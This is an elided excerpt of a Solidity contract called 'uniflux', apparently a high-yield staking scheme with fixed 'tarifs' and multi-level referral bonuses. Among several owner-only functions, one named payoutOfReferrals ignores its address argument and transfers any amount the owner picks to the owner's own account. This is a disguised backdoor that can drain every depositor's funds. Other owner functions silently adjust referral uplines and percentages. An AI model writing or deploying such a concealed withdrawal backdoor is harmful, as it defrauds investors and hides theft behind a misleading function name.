...
contract uniflux {
    ...
    constructor() public {
     ...
     tarifs.push(Tarif(14,168,10000000));
     ref_bonuses.push(5);
     ref_bonuses.push(3);
     ref_bonuses.push(2);
    }
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Invalid Tarif");
        require(msg.value >= tarifs[_tarif].min_inv, "Less than minimum stake");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 100, "Maximum of 100 deposits per address");
    ...
    function withdraw() external payable {
        ...
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Amount is zero");
    ...
    function addreferral_upline(address _upped) public {
        require(msg.sender == owner,"not authorized");
        refuplines[_upped] = true;
    }
    function upline_percentage(uint256 per) public {
        require(msg.sender == owner,"not authorized");
        refuplinespercentage = per;
    }

    function payoutOfReferrals(address _addr, uint256 _amount) public  {
        require(msg.sender == owner,"not authorized");
        uint256 refbonus = _amount;
        owner.transfer(refbonus);
    }

    function remove_upline(address _upped) public {
        require(msg.sender == owner,"not authorized");
